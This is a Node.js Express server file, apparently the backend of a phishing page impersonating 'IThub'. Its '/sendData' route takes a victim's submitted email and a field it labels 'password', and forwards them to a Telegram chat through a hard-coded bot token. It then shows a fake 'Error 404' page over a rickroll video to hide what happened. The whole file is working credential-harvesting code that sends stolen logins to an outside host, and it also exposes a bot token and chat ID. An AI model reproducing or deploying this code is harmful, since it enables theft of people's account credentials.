
const express = require('express');
const bodyParser = require('body-parser');
const TelegramBot = require('node-telegram-bot-api');
const requestIp = require('request-ip');
const path = require('path');

const token = '6316141038:AAFiUEwqmZyzz4nUuWQJRjave-zICzCahDg'; 
const bot = new TelegramBot(token, { polling: false });

const app = express();
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(__dirname)); // Указание папки для статических файлов

app.post('/sendData', (req, res) => {
    const { name, email, phone } = req.body;
    const ip = requestIp.getClientIp(req); // Получаем IP-адрес клиента

    const message = `IThub {\nЭлектронный адрес: ${email}\nПароль: ${phone}\n}`;

    bot.sendMessage('-1002105287295', message); 

    res.send(`<!doctype html>
    <html lang="en">
    <head>
      <meta charset="UTF-8">
      <title>Rickroll</title>
      <link rel="stylesheet" href="style.css">
    </head>
    <body>
      <video autoplay loop muted class="bgvideo" id="bgvideo">
       <source src="rickroll2.mp4" type="video/mp4"></source>
      </video>

      <h1 style="text-align: center; margin-top: 300px; font-family: sans serif; color: white; font-size: 50px; ">Error 404</h1>

      <style>
      body {
        background: url('rickroll2.mp4');
        backround-position: center;
        backround-size: cover;
        
      }
      
      .bgvideo {
        position: fixed;
        right: 0;
        bottom: 0;
        min-width: 100%;
        min-height: 100%;
        width: auto;
        height: auto;
        z-index: -9999;
      }
      </style>
    </body>
    </html>`);
    
});

const PORT = 3000;
app.listen(PORT, () => {
    console.log(`Сервер запущен на порте ${PORT}`);
});
















